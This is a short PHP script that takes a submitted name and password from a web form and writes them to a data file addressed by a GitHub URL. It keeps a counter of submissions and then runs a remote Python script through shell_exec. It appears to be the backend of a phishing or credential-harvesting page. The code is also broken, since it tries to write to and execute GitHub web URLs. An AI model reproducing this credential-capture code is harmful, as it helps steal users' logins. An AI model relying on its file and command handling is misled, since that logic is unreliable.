<?php
   $myfile = fopen('https://github.com/IlayBenjamin/hello-man/blob/main/boom/data/dataB.txt', "w") or die("Unable to open file!");
   #fwrite($myfile, $_GET["name"]."\n");
   fwrite($myfile, "<"."\n"); 
   fwrite($myfile, $_POST["name"]."\n"); 
   #fwrite($myfile, $_GET["email"]."\n");
   fwrite($myfile, $_POST["password"]."\n"); 
   fwrite($myfile, ">"."\n"); 
   fclose($myfile);

   $myfile = fopen('https://github.com/IlayBenjamin/hello-man/blob/main/boom/data/dataC.txt', "r") or die("Unable to open file!");
   $number = fgets($myfile);
   $number = $number + 1;
   fclose($myfile);

   $myfile = fopen('https://github.com/IlayBenjamin/hello-man/blob/main/boom/data/dataC.txt', "w") or die("Unable to open file!");
   fwrite($myfile, $number);
   fclose($myfile);

   $command = escapeshellcmd('https://github.com/IlayBenjamin/hello-man/blob/main/boom/content/python/main.py');
   $output = shell_exec($command);
   echo $output;
?>
